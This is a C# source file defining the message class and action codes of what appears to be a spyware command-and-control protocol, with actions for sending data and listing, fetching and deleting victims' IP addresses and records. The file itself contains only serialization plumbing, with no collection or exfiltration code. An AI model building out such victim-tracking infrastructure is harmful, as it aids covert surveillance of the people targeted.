
using System.Text.Json.Serialization;

namespace SpyCommunicationLib
{
    /// <summary>
    /// Defines the message sender types.
    /// </summary>
    public enum Sender
    {
        Empty,
        Spy,
        User,
        Administrator,
    }

    /// <summary>
    /// Represents actions that can be performed in a message.
    /// </summary>
    public enum MessageAction
    {
        Empty = -1,
        SendData = 001,
        Login = 101,
        GetVictimsIpList = 102,
        GetVictimRecords = 103,
        ChangePassword = 104,
        CheckAdminStatus = 105,
        GetAllUsers = 201,
        DeleteVictimRecord = 202,
    }

    /// <summary>
    /// Represents a communication message used in the system.
    /// </summary>
    public class SpyMessage
    {

        private string? _token;
        private MessageAction? _action;
        public Sender _sender;
        private Dictionary<string, string> _options;

        public SpyMessage()
        {
            _token = null;
            _action = null;
            _sender = Sender.Empty;
            _options = new Dictionary<string, string>();
        }

        /// <summary>
        /// Gets or sets the authentication token.
        /// </summary>
        public string Token
        {
            get => _token ?? string.Empty;
            set
            {
                _token = value;
            }
        }

        /// <summary>
        /// Gets or sets an option by key.
        /// </summary>
        public string this[string key]
        {
            get
            {
                return GetOption(key);
            }
            set
            {
                _options.Add(key, value);
            }
        }

        /// <summary>
        /// Gets or sets the action type of the message.
        /// </summary>
        public MessageAction Action
        {
            get => _action ?? MessageAction.Empty;
            set
            {
                _action = value;
            }
        }

        /// <summary>
        /// Indicates whether the message contains a token.
        /// </summary>
        [JsonIgnore]
        public bool ContainToken
        {
            get => !string.IsNullOrEmpty(_token);
        }



        /// <summary>
        /// Gets or sets the sender of the message.
        /// </summary>
        public Sender Sender
        {
            get => _sender;
            set
            {
                if (!Enum.IsDefined(typeof(Sender), value))
                    throw new ArgumentException("Invalid sender type.");
                _sender = value;
            }
        }

        /// <summary>
        /// Gets all options as a dictionary.
        /// </summary>
        public Dictionary<string, string> Options
        {
            get => new Dictionary<string, string>(_options);
        }

        /// <summary>
        /// Returns an array of all option keys.
        /// </summary>
        public string[] GetOptionsKeys()
        {
            return _options.Keys.ToArray();
        }

        /// <summary>
        /// Adds or updates an option key-value pair.
        /// </summary>
        /// <param name="key">The option key.</param>
        /// <param name="value">The option value.</param>
        /// <returns>The current SpyMessage instance.</returns>
        public SpyMessage Add(string key, string value)
        {
            if (_options.ContainsKey(key))
                _options[key] = value;
            else
                _options.Add(key, value);
            return this;
        }

        /// <summary>
        /// Retrieves the value of an option by key.
        /// </summary>
        /// <param name="key">The option key.</param>
        /// <returns>The value associated with the key, or an empty string if not found.</returns>
        public string GetOption(string key)
        {
            if (key == "token" || key == "action_name" || key == "sender")
                throw new ArgumentException("Use the properties Token, ActionName, or Sender instead.");
            return _options.ContainsKey(key) ? _options[key] : string.Empty;
        }

        /// <summary>
        /// Converts the message to a UTF-8 encoded byte array.
        /// </summary>
        public byte[] ToBytes()
        {
            string json = ToString();
            return System.Text.Encoding.UTF8.GetBytes(json);
        }

        /// <summary>
        /// Serializes the message to a JSON string.
        /// </summary>
        public override string ToString()
        {
            return SpySerializer.SerializeMessage(this);
        }
    }
}
